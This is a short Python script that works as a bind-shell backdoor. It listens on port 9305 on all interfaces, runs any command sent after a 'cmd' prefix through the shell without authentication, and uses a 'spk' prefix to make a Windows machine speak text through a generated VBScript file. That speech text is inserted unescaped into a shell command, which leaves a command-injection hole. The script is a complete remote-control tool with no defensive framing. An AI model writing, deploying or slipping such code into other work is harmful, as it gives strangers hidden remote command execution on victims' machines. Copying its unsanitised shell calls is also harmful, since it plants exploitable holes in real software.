import socket, subprocess, os
current_directory = os.getcwd()

host = "0.0.0.0"
port = 9305

server_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

server_socket.bind((host, port))

server_socket.listen(5)

client_socket, client_address = server_socket.accept()

while True:
    try:
        data = client_socket.recv(1024)
        info = data.decode('utf-8')
        
        print(info)
        if info[:3] == 'cmd':
            info = info[4:]
            subprocess.Popen(info, shell=True, cwd=current_directory)
            response = "command sent"
        elif info[:3] == 'spk':
            info = info[4:]
            subprocess.Popen(f'echo set obj = CreateObject("SAPI.SpVoice"): obj.Speak "{info}" > spk.vbs && spk.vbs', shell=True, cwd=current_directory)
            response = "speak successful"
        elif info == "QUIT":
            response = "QUITED"
            break
        else:
            response = "invalid command"
        
        client_socket.send(response.encode('utf-8'))
        
    except:
        pass

client_socket.close()
server_socket.close()

